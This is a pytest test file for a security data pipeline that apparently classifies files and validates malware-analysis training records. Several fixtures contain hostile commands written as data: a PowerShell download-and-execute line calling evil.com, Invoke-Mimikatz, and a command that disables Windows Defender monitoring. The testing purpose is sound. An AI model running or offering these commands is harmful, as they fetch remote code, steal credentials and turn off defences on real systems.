# tests/test_core.py  ─  Cyber Data Engine v3
# Run: pytest tests/ -v

import io
import json
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

import pytest

# ─────────────────────────────────────────────────────────────────────────────
# Parser tests
# ─────────────────────────────────────────────────────────────────────────────

from shared_lib.parser import FileParser

class TestFileParser:

    def setup_method(self):
        self.p = FileParser(chunk_size=500, overlap=50)

    def test_chunk_basic(self):
        text   = "A" * 1200
        chunks = self.p.chunk(text)
        assert len(chunks) >= 3
        assert all(len(c) <= 500 for c in chunks)

    def test_chunk_empty(self):
        assert self.p.chunk("") == []
        assert self.p.chunk("   ") == []

    def test_chunk_short(self):
        text   = "Hello world"
        chunks = self.p.chunk(text)
        # MIN_CHUNK_CHARS is 80, so "Hello world" will return empty array
        assert len(chunks) == 0

    def test_semantic_split_python(self):
        code = "def foo():\n    pass\n\ndef bar():\n    return 1\n" + ("#" * 100) # Ensure it passes min chunk chars
        chunks = self.p.chunk(code)
        assert len(chunks) >= 1

    def test_read_text_bytes(self):
        f   = io.BytesIO(b"Hello world\nLine 2")
        txt = self.p.read(f, "test.txt")
        assert "Hello world" in txt

    def test_read_text_utf8(self):
        # Intentional: Arabic Unicode string to verify UTF-8 round-trip in FileParser
        f   = io.BytesIO("مرحبا".encode("utf-8"))
        txt = self.p.read(f, "test.txt")
        assert "مرحبا" in txt  # Parser must preserve non-ASCII Unicode correctly

    def test_overlap_creates_continuity(self):
        p = FileParser(chunk_size=100, overlap=20)
        text = "X" * 300
        chunks = p.chunk(text)
        # Consecutive chunks should share content
        assert len(chunks) >= 2


# ─────────────────────────────────────────────────────────────────────────────
# Classifier tests
# ─────────────────────────────────────────────────────────────────────────────

from backend.core.classifier import ContentClassifier
from shared_lib.schemas    import DataSchema, TaskType

class TestClassifier:

    def setup_method(self):
        self.c = ContentClassifier()

    def test_powershell_malware(self):
        cls = self.c.classify("dropper.ps1",
              "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/x')")
        assert cls.schema == DataSchema.CHAIN_OF_THOUGHT
        assert cls.task_type == TaskType.MALWARE_ANALYSIS
        assert cls.confidence >= 0.5

    def test_python_tool(self):
        cls = self.c.classify("scanner.py",
              "import socket\ndef main():\n    if __name__ == '__main__':\n        pass")
        assert cls.schema == DataSchema.CODE_GEN
        assert cls.task_type == TaskType.CODE_GENERATION

    def test_log_file(self):
        cls = self.c.classify("syslog.log",
              "2024-01-01T12:00:00 [ERROR] authentication failure for user admin")
        assert cls.task_type == TaskType.GENERAL_CYBER

    def test_pdf_threat_report(self):
        cls = self.c.classify("apt29_report.pdf",
              "Executive Summary: This report covers the IOC indicators and T1059.001 techniques")
        assert cls.task_type in {TaskType.THREAT_INTEL, TaskType.MALWARE_ANALYSIS, TaskType.GENERAL_CYBER}

    def test_binary_exe(self):
        cls = self.c.classify("malware.exe", "")
        assert cls.is_binary is True
        assert cls.task_type == TaskType.MALWARE_ANALYSIS

    def test_cve_document(self):
        cls = self.c.classify("vuln.txt",
              "CVE-2024-12345 CVSS score 9.8 affects all versions below 3.2")
        assert cls.task_type == TaskType.GENERAL_CYBER

    def test_confidence_range(self):
        cls = self.c.classify("unknown.xyz", "random content")
        assert 0.0 <= cls.confidence <= 1.0

    def test_high_entropy_flagged(self):
        import random, string
        high_ent = "".join(random.choices(string.printable, k=500))
        cls = self.c.classify("payload.txt", high_ent)
        # High entropy should be flagged — may be malware or analysis
        assert cls.confidence >= 0.0   # just ensure it doesn't crash


# ─────────────────────────────────────────────────────────────────────────────
# Validator tests
# ─────────────────────────────────────────────────────────────────────────────

from shared_lib.validator  import validate
from shared_lib.schemas import Classification

def _cls(schema=DataSchema.CHAIN_OF_THOUGHT, task=TaskType.MALWARE_ANALYSIS) -> Classification:
    return Classification(schema=schema, task_type=task, data_type=DataType.ATTACK_ARTIFACT, confidence=0.9)


class TestValidator:

    def test_valid_cot(self):
        raw = json.dumps({
            "instruction": "Analyze this malware sample to determine its purpose, capabilities, and threat level. Identify any indicators of compromise.",
            "evidence":    "IEX DownloadString http://evil.com/payload.ps1; Invoke-Mimikatz; Set-MpPreference -DisableRealtimeMonitoring $true",
            "reasoning":   "1) Language: The script is written using PowerShell syntax, which is commonly used by attackers for living-off-the-land techniques.\n2) IEX = Invoke-Expression: This command evaluates and executes a string as code, specifically downloading remote code from an external URL.\n3) Downloads remote code: The script fetches an additional payload from http://evil.com/payload.ps1, suggesting a stager or dropper behavior.\n4) T1059.001: This maps directly to the MITRE ATT&CK framework technique for Command and Scripting Interpreter: PowerShell.\n5) High severity: The combination of remote code execution, disabling Windows Defender (Set-MpPreference), and credential dumping tools (Mimikatz) indicates a critical security threat that requires immediate containment and remediation.",
            "answer":      "Severity: HIGH — This is a malicious PowerShell dropper utilizing T1059.001 to execute remote code. It disables security monitoring and likely attempts credential theft.",
            "task_type":   "malware_analysis",
            "severity":    "HIGH",
            "mitre_ids":   ["T1059.001"],
            "iocs":        ["evil.com"],
        })
        result = validate(raw, _cls())
        assert result.ok
        assert result.schema_used == "chain_of_thought"
        assert result.record_count == 1
        assert result.alpaca_lines

    def test_valid_qa(self):
        raw = json.dumps({
            "pairs": [
                {
                    "question":   "What technique does APT29 use for PowerShell execution?",
                    "context":    "APT29 uses encoded PowerShell commands with -EncodedCommand flag.",
                    "answer":     "T1059.001 — Command and Scripting Interpreter: PowerShell",
                    "difficulty": "medium",
                    "task_type":  "threat_intel",
                },
                {
                    "question":   "What flag hides PowerShell payloads?",
                    "context":    "APT29 uses the -EncodedCommand flag to pass Base64-encoded scripts.",
                    "answer":     "The -EncodedCommand (or -enc) flag passes Base64-encoded scripts.",
                    "difficulty": "easy",
                    "task_type":  "threat_intel",
                },
            ]
        })
        result = validate(raw, _cls(DataSchema.QA, TaskType.THREAT_INTEL))
        assert result.ok
        assert result.record_count == 2
        assert len(result.alpaca_lines) == 2

    def test_fence_stripped(self):
        raw = '```json\n{"instruction":"Analyze this malware sample to determine its purpose, capabilities, and threat level. Identify any indicators of compromise.","evidence":"IEX DownloadString http://evil.com/payload.ps1; Invoke-Mimikatz; Set-MpPreference -DisableRealtimeMonitoring $true","reasoning":"1) Language: The script is written using PowerShell syntax, which is commonly used by attackers for living-off-the-land techniques.\\n2) IEX = Invoke-Expression: This command evaluates and executes a string as code, specifically downloading remote code from an external URL.\\n3) Downloads remote code: The script fetches an additional payload from http://evil.com/payload.ps1, suggesting a stager or dropper behavior.\\n4) T1059.001: This maps directly to the MITRE ATT&CK framework technique for Command and Scripting Interpreter: PowerShell.\\n5) High severity: The combination of remote code execution, disabling Windows Defender (Set-MpPreference), and credential dumping tools (Mimikatz) indicates a critical security threat that requires immediate containment and remediation.","answer":"Severity: HIGH — This is a malicious PowerShell dropper utilizing T1059.001 to execute remote code. It disables security monitoring and likely attempts credential theft.","task_type":"malware_analysis","severity":"HIGH","mitre_ids":["T1059.001"],"iocs":["evil.com"]}\n```'
        result = validate(raw, _cls())
        assert result.ok

    def test_empty_response_fails(self):
        result = validate("", _cls())
        assert not result.ok

    def test_invalid_json_fails(self):
        result = validate("this is not json at all +++", _cls())
        assert not result.ok

    def test_alpaca_fallback(self):
        raw = json.dumps({
            "instruction": "What is SQL injection? Provide a detailed explanation.",
            "input":       "",
            "output":      "SQL injection is a code injection technique that exploits vulnerabilities in database queries. It allows an attacker to interfere with the queries that an application makes to its database, potentially granting them access to unauthorized data or administrative privileges. This occurs when user-supplied input is not properly sanitized and is directly concatenated into SQL statements.",
        })
        result = validate(raw, _cls(DataSchema.ALPACA, TaskType.GENERAL_CYBER))
        assert result.ok

    def test_code_gen_schema(self):
        raw = json.dumps({
            "inferred_prompt": "Write a Python TCP port scanner that accepts a host and port range, scans the ports, and reports which ones are open and listening for connections.",
            "language":        "Python 3.x",
            "code":            "import socket\ndef scan(host, port):\n    s=socket.socket()\n    s.settimeout(1)\n    try:\n        s.connect((host,port))\n        return True\n    except:\n        return False\n    finally:\n        s.close()",
            "description":     "TCP port scanner that attempts to establish a connection to a specific host and port to determine if it is open.",
            "security_notes":  "For authorized testing only. Scanning ports without permission may be illegal.",
        })
        result = validate(raw, _cls(DataSchema.CODE_GEN, TaskType.CODE_GENERATION))
        assert result.ok
        assert result.schema_used == "code_gen"

    def test_quality_score_range(self):
        raw = json.dumps({
            "instruction": "Analyze this malware sample to determine its purpose, capabilities, and threat level. Identify any indicators of compromise.",
            "evidence":    "IEX DownloadString http://evil.com/payload.ps1; Invoke-Mimikatz; Set-MpPreference -DisableRealtimeMonitoring $true",
            "reasoning":   "1) Language: The script is written using PowerShell syntax, which is commonly used by attackers for living-off-the-land techniques.\n2) IEX = Invoke-Expression: This command evaluates and executes a string as code, specifically downloading remote code from an external URL.\n3) Downloads remote code: The script fetches an additional payload from http://evil.com/payload.ps1, suggesting a stager or dropper behavior.\n4) T1059.001: This maps directly to the MITRE ATT&CK framework technique for Command and Scripting Interpreter: PowerShell.\n5) High severity: The combination of remote code execution, disabling Windows Defender (Set-MpPreference), and credential dumping tools (Mimikatz) indicates a critical security threat that requires immediate containment and remediation.",
            "answer":      "Severity: HIGH — This is a malicious PowerShell dropper utilizing T1059.001 to execute remote code. It disables security monitoring and likely attempts credential theft.",
            "task_type":   "malware_analysis",
            "severity":    "HIGH",
            "mitre_ids":   ["T1059.001"],
            "iocs":        ["evil.com"],
        })
        result = validate(raw, _cls())
        assert result.ok
        assert 0.0 <= result.quality <= 1.0

    def test_alpaca_line_valid_json(self):
        raw = json.dumps({
            "instruction": "Analyze this malware",
            "evidence":    "shellcode = b'\\x90\\x90\\x90'",
            "reasoning":   "1) NOP sled\n2) Shellcode\n3) Buffer overflow\n4) T1203\n5) HIGH",
            "answer":      "Buffer overflow exploit with NOP sled — T1203",
            "task_type":   "malware_analysis",
            "severity":    "CRITICAL",
            "mitre_ids":   ["T1203"],
            "iocs":        [],
        })
        result = validate(raw, _cls())
        if result.ok:
            for line in result.alpaca_lines:
                obj = json.loads(line)   # must be valid JSON
                assert "instruction" in obj
                assert "output" in obj


# ─────────────────────────────────────────────────────────────────────────────
# Schema tests
# ─────────────────────────────────────────────────────────────────────────────

from shared_lib.schemas import (
    ChainOfThoughtEntry, QABatchEntry, QAPair,
    AlpacaEntry, CodeGenEntry, DataSchema, TaskType, Severity, DataType
)

class TestSchemas:

    def test_alpaca_serialise(self):
        e = AlpacaEntry(
            task_type=TaskType.GENERAL_CYBER,
            instruction="What is a rootkit? Please explain in detail.",
            input="",
            output="A rootkit is malware designed to hide its presence or other software's presence on a system.",
        )
        line = e.to_jsonl()
        obj  = json.loads(line)
        assert obj["instruction"] == "What is a rootkit? Please explain in detail."

    def test_cot_to_alpaca(self):
        e = ChainOfThoughtEntry(
            task_type=TaskType.MALWARE_ANALYSIS,
            instruction="Analyze this malicious sample to identify what it is doing.",
            evidence="bad code that is very obviously malware.",
            reasoning="1) bad\n2) very bad\n3) exploit\n4) T1055\n5) HIGH severity malware doing malicious things in memory to inject code.",
            answer="Malicious: T1055 process injection identified in the sample.",
            severity=Severity.HIGH,
        )
        line = e.to_alpaca_jsonl()
        obj  = json.loads(line)
        assert "Reasoning" in obj["output"]
        assert "Answer"    in obj["output"]

    def test_qa_batch_multiple_lines(self):
        batch = QABatchEntry(
            task_type=TaskType.CTI_QA,
            pairs=[
                QAPair(question="Question number 1?", context="Context for the question.", answer="Answer number 1."),
                QAPair(question="Question number 2?", context="Context for the question.", answer="Answer number 2."),
                QAPair(question="Question number 3?", context="Context for the question.", answer="Answer number 3."),
            ],
        )
        alpaca_str = batch.to_alpaca_jsonl()
        lines = [l for l in alpaca_str.split("\n") if l.strip()]
        assert len(lines) == 3
        for line in lines:
            obj = json.loads(line)
            assert "instruction" in obj

    def test_code_no_fences(self):
        e = CodeGenEntry(
            inferred_prompt="Write a port scanner",
            language="Python",
            code="```python\nimport socket\n```",
        )
        assert "```" not in e.code

    def test_severity_enum(self):
        assert Severity("CRITICAL") == Severity.CRITICAL
        assert Severity("HIGH") == Severity.HIGH


# ─────────────────────────────────────────────────────────────────────────────
# Providers tests (offline — no actual HTTP calls)
# ─────────────────────────────────────────────────────────────────────────────

from backend.core.providers import (
    ModelGateway, ProviderConfig, ProviderType, RoutingStrategy,
    make_ollama_provider, make_lmstudio_provider,
)

class TestProviders:

    def test_make_ollama_defaults(self):
        cfg = make_ollama_provider()
        assert cfg.provider_type == ProviderType.OLLAMA
        assert cfg.model == "llama3"
        assert cfg.enabled is True

    def test_make_lmstudio(self):
        cfg = make_lmstudio_provider(name="test", model="mistral")
        assert cfg.provider_type == ProviderType.OPENAI_COMPAT
        assert cfg.model == "mistral"

    @pytest.mark.asyncio
    async def test_gateway_no_providers_raises(self):
        gw = ModelGateway(providers=[], strategy=RoutingStrategy.PRIMARY_FALLBACK)
        with pytest.raises(RuntimeError):
            await gw.generate("content", _cls(), "test.txt")

    @pytest.mark.asyncio
    async def test_gateway_disabled_providers_raises(self):
        cfg = make_ollama_provider()
        cfg.enabled = False
        gw = ModelGateway(providers=[cfg])
        with pytest.raises(RuntimeError):
            await gw.generate("content", _cls(), "test.txt")

    @pytest.mark.asyncio
    async def test_routing_round_robin_rotates(self):
        cfg1 = make_ollama_provider(name="a")
        cfg2 = make_ollama_provider(name="b")
        gw = ModelGateway([cfg1, cfg2], RoutingStrategy.ROUND_ROBIN)
        # First call selects from index 0
        ordered1 = await gw._select_providers(_cls())
        assert ordered1[0].name == "a"
        # Second call should rotate
        ordered2 = await gw._select_providers(_cls())
        assert ordered2[0].name == "b"

    def test_provider_stats(self):
        cfg = make_ollama_provider()
        cfg.record_success(1.23)
        cfg.record_success(0.98)
        cfg.record_failure()
        assert cfg._success == 2
        assert cfg._fail == 1
        assert abs(cfg.avg_latency - 1.105) < 0.01
        assert abs(cfg.success_rate - 2/3) < 0.01

    @pytest.mark.asyncio
    async def test_schema_route_prefers_affinity(self):
        cfg_big   = make_ollama_provider(name="big",
                                          preferred_schemas=["chain_of_thought"])
        cfg_small = make_ollama_provider(name="small", preferred_schemas=[])
        gw = ModelGateway([cfg_small, cfg_big], RoutingStrategy.SCHEMA_ROUTE)
        cls_cot = _cls(DataSchema.CHAIN_OF_THOUGHT)
        ordered = await gw._select_providers(cls_cot)
        assert ordered[0].name == "big"
